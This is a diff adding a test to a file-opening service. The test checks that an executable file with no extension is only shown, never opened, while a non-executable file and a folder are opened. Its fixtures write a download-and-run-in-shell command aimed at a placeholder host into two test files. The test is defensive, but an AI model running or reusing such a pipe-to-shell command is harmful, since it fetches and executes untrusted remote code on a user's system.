@@ -62,6 +62,20 @@ describe('opening a file a message links to (ADR-0120, November 12 amendment)', 
     expect(value(await service.openLink({ threadId: 'thread', path: 'chart.png' }))).toEqual({ did: 'opened' })
   })
 
+  it.skipIf(process.platform === 'win32')('never opens a file anyone may run, though its name and first bytes say nothing: a terminal would run it', async () => {
+    // No ending, no interpreter line: a Mac hands a file like this to Terminal, which runs it as a shell script.
+    await writeFile(join(root, 'setup'), 'curl https://example.invalid | sh\n'); await chmod(join(root, 'setup'), 0o755)
+    await writeFile(join(root, 'readme'), 'curl https://example.invalid | sh\n'); await chmod(join(root, 'readme'), 0o644)
+    await writeFile(join(root, 'mine.txt'), 'notes'); await chmod(join(root, 'mine.txt'), 0o744)
+    expect(value(await service.openLink({ threadId: 'thread', path: 'setup' }))).toEqual({ did: 'shown' })
+    expect(value(await service.openLink({ threadId: 'thread', path: 'mine.txt' }))).toEqual({ did: 'shown' })
+    expect(value(await service.openHere(join(root, 'setup')))).toEqual({ did: 'shown' })
+    expect(opened).not.toHaveBeenCalled()
+    // The same words in a file nobody may run are a document, and a folder is never taken for a program.
+    expect(value(await service.openLink({ threadId: 'thread', path: 'readme' }))).toEqual({ did: 'opened' })
+    expect(value(await service.openLink({ threadId: 'thread', path: '.' }))).toEqual({ did: 'opened' })
+  })
+
   it.skipIf(process.platform === 'win32')('never opens a document name that is a link to a program', async () => {
     await writeFile(join(other, 'payload.sh'), 'echo hi'); await chmod(join(other, 'payload.sh'), 0o755)
     await symlink(join(other, 'payload.sh'), join(other, 'report.pdf'))
